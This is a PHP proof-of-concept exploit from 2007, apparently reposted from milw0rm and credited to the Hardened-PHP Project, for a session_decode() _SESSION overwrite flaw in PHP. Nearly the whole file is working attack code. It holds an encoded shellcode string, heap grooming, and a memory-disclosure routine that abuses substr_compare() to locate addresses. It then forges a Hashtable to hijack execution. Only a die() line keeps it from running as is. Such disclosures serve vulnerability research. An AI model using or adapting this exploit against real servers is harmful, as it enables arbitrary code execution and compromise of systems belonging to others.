<?php
  ////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  //
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
  //                                                                    //
  //         Proof of concept code from the Hardened-PHP Project        //
  //                   (C) Copyright 2007 Stefan Esser                  //
  //                                                                    //
  ////////////////////////////////////////////////////////////////////////
  //       PHP session_decode() _SESSION Overwrite Vulnerability        //
  ////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die("REMOVE THIS LINE");

  $shellcode = "\x29\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x46".
      "\x32\x3c\xe5\x83\xeb\xfc\xe2\xf4\x77\xe9\x6f\xa6\x15\x58\x3e\x8f".
      "\x20\x6a\xa5\x6c\xa7\xff\xbc\x73\x05\x60\x5a\x8d\x57\x6e\x5a\xb6".
      "\xcf\xd3\x56\x83\x1e\x62\x6d\xb3\xcf\xd3\xf1\x65\xf6\x54\xed\x06".
      "\x8b\xb2\x6e\xb7\x10\x71\xb5\x04\xf6\x54\xf1\x65\xd5\x58\x3e\xbc".
      "\xf6\x0d\xf1\x65\x0f\x4b\xc5\x55\x4d\x60\x54\xca\x69\x41\x54\x8d".
      "\x69\x50\x55\x8b\xcf\xd1\x6e\xb6\xcf\xd3\xf1\x65".
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

  findOffsets();



  $Hashtable = pack("LLLLLLLLLCCC", 2, 1, 0, 0, 0, $offset_1+0x70, 0, $offset_1+0x70, $offset_1, 0, 0, 0);

  $str = '_SESSION|s:39:"'.$Hashtable.'"|a|i:0;a|i:0;';
  
  session_start();
  session_decode($str);







  // This function uses the substr_compare() vulnerability
  // to get the offsets. 
  
  function findOffsets()
  {
    global $offset_1, $offset_2, $shellcode;
    // We need to NOT clear these variables,
    //  otherwise the heap is too segmented
    global $memdump, $d, $arr;
    
    $sizeofHashtable = 39;
    $maxlong = 0x7fffffff;

    // Signature of a big endian Hashtable of size 256 with 1 element
    $search = "\x00\x01\x00\x00\xff\x00\x00\x00\x01\x00\x00\x00";

    $memdump = str_repeat("A", 4096);
    for ($i=0; $i<400; $i++) {
	  $d[$i]=array();
    }
    unset($d[350]);
    $x = str_repeat("\x01", $sizeofHashtable);
    unset($d[351]);
    unset($d[352]);
    $arr = array();
    for ($i=0; $i<129; $i++) { $arr[$i] = 1; }
    $arr[$shellcode] = 1;
    for ($i=0; $i<129; $i++) { unset($arr[$i]); }

    // If the libc memcmp leaks the information use it
    // otherwise we only get a case insensitive memdump
    $b = substr_compare(chr(65),chr(0),0,1,false) != 65;

    for ($i=0; $i<4096; $i++) {
      $y = substr_compare($x, chr(0), $i+1, $maxlong, $b);
      $Y = substr_compare($x, chr(1), $i+1, $maxlong, $b);
      if ($y-$Y == 1 || $Y-$y==1){
        $y = chr($y);
        if ($b && strtoupper($y)!=$y) {
          if (substr_compare($x, $y, $i+1, $maxlong, false)==-1) {
            $y = strtoupper($y);
          }
        }
        $memdump[$i] = $y;
      } else {
  	    $y = substr_compare($x, chr(1), $i+1, $maxlong, $b);
        $Y = substr_compare($x, chr(2), $i+1, $maxlong, $b);
        if ($y-$Y != 1 && $Y-$y!=1){
	      $memdump[$i] = chr(1);
        } else {
          $memdump[$i] = chr(0);
        }   
      }
    }
    
    // Search shellcode and hashtable and calculate memory address
    $pos_shellcode = strpos($memdump, $shellcode);
    $pos_hashtable = strpos($memdump, $search);
    $addr = substr($memdump, $pos_hashtable+6*4, 4);
    $addr = unpack("L", $addr);
    
    // Fill in both offsets  
    $offset_1 = $addr[1] + 32;
    $offset_2 = $offset_1 - $pos_shellcode + $pos_hashtable + 8*4;
  }

?>

# milw0rm.com [2007-03-25]
